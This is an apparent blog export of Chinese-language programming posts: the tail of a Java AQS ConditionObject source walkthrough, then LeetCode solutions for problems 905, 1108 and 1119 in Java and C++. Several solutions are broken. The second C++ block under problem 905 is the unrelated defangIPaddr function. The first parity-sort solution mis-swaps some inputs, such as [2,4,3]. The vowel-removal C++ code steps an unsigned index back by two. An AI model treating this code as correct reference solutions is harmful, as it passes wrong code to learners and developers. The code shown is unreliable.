<h3 id="await-long-time-TimeUnit-unit-方法"><a href="#await-long-time-TimeUnit-unit-方法" class="headerlink" title="await(long time, TimeUnit unit)方法"></a>await(long time, TimeUnit unit)方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 和await方法类似，超时就移入AQS的FIFO队列</span></span><br><span class="line"><span class="comment">       * Implements timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If timed out while blocked in step 4, return false, else true.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">await</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">long</span> nanosTimeout = unit.toNanos(time);</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">long</span> deadline = System.nanoTime() + nanosTimeout;</span><br><span class="line">          <span class="keyword">boolean</span> timedout = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &lt;= <span class="number">0L</span>) &#123;</span><br><span class="line">                  timedout = transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &gt;= spinForTimeoutThreshold)</span><br><span class="line">                  LockSupport.parkNanos(<span class="keyword">this</span>, nanosTimeout);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              nanosTimeout = deadline - System.nanoTime();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> !timedout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="signal方法"><a href="#signal方法" class="headerlink" title="signal方法"></a>signal方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 将等待时间最长的节点，也就是首节点移入AQS的FIFO队列去竞争锁</span></span><br><span class="line"><span class="comment"> * 当前线程需要获取锁</span></span><br><span class="line"><span class="comment">       * Moves the longest-waiting thread, if one exists, from the</span></span><br><span class="line"><span class="comment">       * wait queue for this condition to the wait queue for the</span></span><br><span class="line"><span class="comment">       * owning lock.</span></span><br><span class="line"><span class="comment">       *</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@throws</span> IllegalMonitorStateException if &#123;<span class="doctag">@link</span> #isHeldExclusively&#125;</span></span><br><span class="line"><span class="comment">       *         returns &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">signal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="comment">// 是否独占锁</span></span><br><span class="line">          <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">          Node first = firstWaiter;</span><br><span class="line">          <span class="keyword">if</span> (first != <span class="keyword">null</span>)</span><br><span class="line">              doSignal(first);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="doSignal方法"><a href="#doSignal方法" class="headerlink" title="doSignal方法"></a>doSignal方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 将Condition队列中第一个非cancalled状态的节点从队列中移除，并移入AQS的FIFO队列中</span></span><br><span class="line"><span class="comment">       * Removes and transfers nodes until hit non-cancelled one or</span></span><br><span class="line"><span class="comment">       * null. Split out from signal in part to encourage compilers</span></span><br><span class="line"><span class="comment">       * to inline the case of no waiters.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@param</span> first (non-null) the first node on condition queue</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSignal</span><span class="params">(Node first)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> ( (firstWaiter = first.nextWaiter) == <span class="keyword">null</span>)</span><br><span class="line">                  lastWaiter = <span class="keyword">null</span>;</span><br><span class="line">              first.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">          &#125; <span class="keyword">while</span> (!transferForSignal(first) &amp;&amp;</span><br><span class="line">                   (first = firstWaiter) != <span class="keyword">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="transferForSignal方法"><a href="#transferForSignal方法" class="headerlink" title="transferForSignal方法"></a><em>transferForSignal</em>方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将Condition队列中的节点移入AQS的FIFO队列。成功返回true</span></span><br><span class="line"><span class="comment"> * 首先enq将该node添加到CLH队列中</span></span><br><span class="line"><span class="comment"> * 其次若CLH队列原先尾节点为CANCELLED或者对原先尾节点CAS设置成SIGNAL失败</span></span><br><span class="line"><span class="comment"> * 则唤醒node节点；否则该节点在CLH队列总前驱节点已经是signal状态了，唤醒工作交给前驱节点</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">    * Transfers a node from a condition queue onto sync queue.</span></span><br><span class="line"><span class="comment">    * Returns true if successful.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if successfully transferred (else the node was</span></span><br><span class="line"><span class="comment">    * cancelled before signal)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">transferForSignal</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If cannot change waitStatus, the node has been cancelled.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">if</span> (!compareAndSetWaitStatus(node, Node.CONDITION, <span class="number">0</span>))</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Splice onto queue and try to set waitStatus of predecessor to</span></span><br><span class="line"><span class="comment">        * indicate that thread is (probably) waiting. If cancelled or</span></span><br><span class="line"><span class="comment">        * attempt to set waitStatus fails, wake up to resync (in which</span></span><br><span class="line"><span class="comment">        * case the waitStatus can be transiently and harmlessly wrong).</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Node p = enq(node);</span><br><span class="line">       <span class="keyword">int</span> ws = p.waitStatus;</span><br><span class="line">       <span class="keyword">if</span> (ws &gt; <span class="number">0</span> || !compareAndSetWaitStatus(p, ws, Node.SIGNAL))</span><br><span class="line">           LockSupport.unpark(node.thread);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="signalAll方法"><a href="#signalAll方法" class="headerlink" title="signalAll方法"></a>signalAll方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将CONDITION队列中所有node出队，逐个添加到FIFO队列末尾</span></span><br><span class="line"><span class="comment">       * Moves all threads from the wait queue for this condition to</span></span><br><span class="line"><span class="comment">       * the wait queue for the owning lock.</span></span><br><span class="line"><span class="comment">       *</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@throws</span> IllegalMonitorStateException if &#123;<span class="doctag">@link</span> #isHeldExclusively&#125;</span></span><br><span class="line"><span class="comment">       *         returns &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">signalAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">          Node first = firstWaiter;</span><br><span class="line">          <span class="keyword">if</span> (first != <span class="keyword">null</span>)</span><br><span class="line">              doSignalAll(first);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="doSignalAll方法"><a href="#doSignalAll方法" class="headerlink" title="doSignalAll方法"></a>doSignalAll方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">       * Removes and transfers all nodes.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@param</span> first (non-null) the first node on condition queue</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSignalAll</span><span class="params">(Node first)</span> </span>&#123;</span><br><span class="line">          lastWaiter = firstWaiter = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              Node next = first.nextWaiter;</span><br><span class="line">              first.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">              transferForSignal(first);</span><br><span class="line">              first = next;</span><br><span class="line">          &#125; <span class="keyword">while</span> (first != <span class="keyword">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>每一个创建的ConditionObject都维持这各自的一个单向的等待队列，但是同一个Lock的所有ConditionObject都共享一个AQS的FIFO同步队列；</li>
<li>当调用await方法时释放锁并进入阻塞状态，调用signal方法将条件等待队列中的首节点线程移动到AQS同步队列中并将其前继节点设置为SIGNAL或者直接唤醒线程使得被通知的线程能去获取锁；</li>
<li><strong>调用await方法释放锁并将线程添加到条件等待队列中并没有采用死循环CAS设置（参考AQS.enq方法）</strong>，因为Condition对象<strong>只能用于独占模式</strong>，而且在调用await之前会显示的获取独占锁，否则会<strong>抛出非法监视器状态异常。</strong></li>
<li><strong>调用signal方法将转移等待节点，也不需要CAS来保证</strong>，因为<strong>signal会确保调用者caller是获取独占锁的线程</strong>（通过<strong>isHeldExclusively方法来判断</strong>，如果为false会<strong>抛出非法监视器状态的异常</strong>）。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/38011904" target="_blank" rel="noopener">Java并发编程-Lock和Condition</a></p>
<p><a href="https://www.jianshu.com/p/4d4c7398e187" target="_blank" rel="noopener">AQS的ConditionObject源码详解</a></p>
<p><a href="https://blog.csdn.net/u011470552/article/details/76571472" target="_blank" rel="noopener">jdk1.8 J.U.C并发源码阅读——AQS之conditionObject内部类分析</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>Condition</tag>
        <tag>并发</tag>
        <tag>Lock</tag>
      </tags>
  </entry>
  <entry>
    <title>905. Sort Array By Parity</title>
    <url>/2020/03/18/LeetCode/leetcode-000905.Sort%20Array%20By%20Parity/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array <code>A</code> of non-negative integers, return an array consisting of all the even elements of <code>A</code>, followed by all the odd elements of <code>A</code>.</p>
<p>You may return any answer array that satisfies this condition.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,1,2,4]</span><br><span class="line">Output: [2,4,3,1]</span><br><span class="line">The outputs [4,2,3,1], [2,4,1,3], and [4,2,1,3] would also be accepted.</span><br></pre></td></tr></table></figure>

<h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a><strong>Note:</strong></h3><ol>
<li><code>1 &lt;= A.length &lt;= 5000</code></li>
<li><code>0 &lt;= A[i] &lt;= 5000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历一次，用两个位置索引，初始化为0，和数组长度减1。分别判断它们对应位子上的数，是奇数还是偶数。如果前一个位置是奇数，后一个是偶数，则对应位置的数互换，否则前一个位置的索引自增，后一个位置的索引自减，直到双方相遇为止。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> j = A.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">				i++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">				j--;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">				<span class="keyword">int</span> temp = A[i];</span><br><span class="line">				A[i++] = A[j];</span><br><span class="line">				A[j--] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> A;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = A.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = A[i];</span><br><span class="line">                A[i++] = A[j];</span><br><span class="line">                A[j--] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>遍历一次，但是用一个位置索引。在遍历的过程中，用一个oddIndex 保存当前偶数的位置索引，从0开始。因为题目要求先输出偶数，后输出奇数。然后遍历数组，在遍历的过程中，如果发现当前遍历的数为偶数，则和oddIndex上的值做交换，然后oddIndex自增。</p>
<p>以数组4，2，1，3为例，</p>
<table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>oddIndex</th>
<th>index</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>4，2，1，3</td>
<td>0</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>开始循环，第一步</td>
<td>4，2，1，3</td>
<td>1</td>
<td>1</td>
<td>index为0的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第二步</td>
<td>4，2，1，3</td>
<td>2</td>
<td>2</td>
<td>index为1的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第三步</td>
<td>4，2，1，3</td>
<td>2</td>
<td>3</td>
<td>没有匹配到偶数</td>
</tr>
</tbody></table>
<p>以数组1，2，3，4为例</p>
<table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>oddIndex</th>
<th>index</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>1，2，3，4</td>
<td>0</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>开始循环，第一步</td>
<td>1，2，3，4</td>
<td>0</td>
<td>1</td>
<td>index为0的位置上为奇数，继续</td>
</tr>
<tr>
<td>第二步</td>
<td>2，1，3，4</td>
<td>1</td>
<td>2</td>
<td>index为1的位置上为偶数，和oddIndex做交换</td>
</tr>
<tr>
<td>第三步</td>
<td>2，1，3，4</td>
<td>1</td>
<td>3</td>
<td>index为2的位置上为奇数，继续</td>
</tr>
<tr>
<td>第四步</td>
<td>2，4，3，1</td>
<td>2</td>
<td>4</td>
<td>index3的位置上为奇数，和oddIndex做交换</td>
</tr>
</tbody></table>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> oddIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> temp = A[i];</span><br><span class="line">                A[i] = A[oddIndex];</span><br><span class="line">                A[oddIndex] = temp;</span><br><span class="line">                oddIndex++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">        <span class="built_in">string</span> str=<span class="string">"[.]"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; address.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = address[i];</span><br><span class="line">            <span class="keyword">if</span>(address[i] == <span class="string">'.'</span>) &#123;</span><br><span class="line">                s.append(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s += c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1108. Defanging an IP Address</title>
    <url>/2020/03/18/LeetCode/leetcode-001108.%20Defanging%20an%20IP%20Address/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a valid (IPv4) IP <code>address</code>, return a defanged version of that IP address.</p>
<p>A <em>defanged IP address</em> replaces every period <code>&quot;.&quot;</code> with <code>&quot;[.]&quot;</code>.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: address &#x3D; &quot;1.1.1.1&quot;</span><br><span class="line">Output: &quot;1[.]1[.]1[.]1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: address = <span class="string">"255.100.50.0"</span></span><br><span class="line">Output: <span class="string">"255[.]100[.]50[.]0"</span></span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints"></a>Constraints</h3><p>The given <code>address</code> is a valid IPv4 address.</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用正则表达式替换。将 <code>.</code> 全部替换为 <code>[.]</code></p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">defangIPaddr</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address.replaceAll(<span class="string">"\\."</span>, <span class="string">"[.]"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>构造一个新的返回字符。遍历当前字符串，如果当前字符串为<code>.</code>，则在它的前后追加<code>[</code>,<code>]</code>即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">defangIPaddr</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">char</span>[] arr = address.toCharArray();</span><br><span class="line">        <span class="keyword">char</span> left = <span class="string">'['</span>;</span><br><span class="line">        <span class="keyword">char</span> right = <span class="string">']'</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] != <span class="string">'.'</span>)&#123;</span><br><span class="line">                result += arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result = result + left + arr[i] + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">        <span class="built_in">string</span> str=<span class="string">"[.]"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; address.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = address[i];</span><br><span class="line">            <span class="keyword">if</span>(address[i] == <span class="string">'.'</span>) &#123;</span><br><span class="line">                s.append(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s += c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1119. Remove Vowels from a String</title>
    <url>/2020/03/18/LeetCode/leetcode-001119.%20Remove%20Vowels%20from%20a%20String/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string <code>S</code>, remove the vowels <code>&#39;a&#39;</code>, <code>&#39;e&#39;</code>, <code>&#39;i&#39;</code>, <code>&#39;o&#39;</code>, and <code>&#39;u&#39;</code> from it, and return the new string.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;leetcodeisacommunityforcoders&quot;</span><br><span class="line">Output: &quot;ltcdscmmntyfrcdrs&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"aeiou"</span></span><br><span class="line">Output: <span class="string">""</span></span><br></pre></td></tr></table></figure>

<h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h3><ol>
<li><code>S</code> consists of lowercase English letters only.</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;&#x3D; S.length &lt;&#x3D; 1000</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用字符串的replace方法，将所有元音字母替换成””。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">String <span class="title">removeVowels</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str.replaceAll(<span class="string">"a"</span>, <span class="string">""</span>).replaceAll(<span class="string">"e"</span>, <span class="string">""</span>).replaceAll(<span class="string">"i"</span>, <span class="string">""</span>).replaceAll(<span class="string">"o"</span>, <span class="string">""</span>).replaceAll(<span class="string">"u"</span>, <span class="string">""</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">remVowels</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels = &#123;<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(vowels.<span class="built_in">begin</span>(), vowels.<span class="built_in">end</span>(), str[i]) != vowels.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                str = str.replace(i, <span class="number">1</span>, <span class="string">""</span>);</span><br><span class="line">                i -= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>所有元音作为一个集合，遍历s里面的所有字符，遇到元音就跳过，最后构造一个新的字符串返回</p>
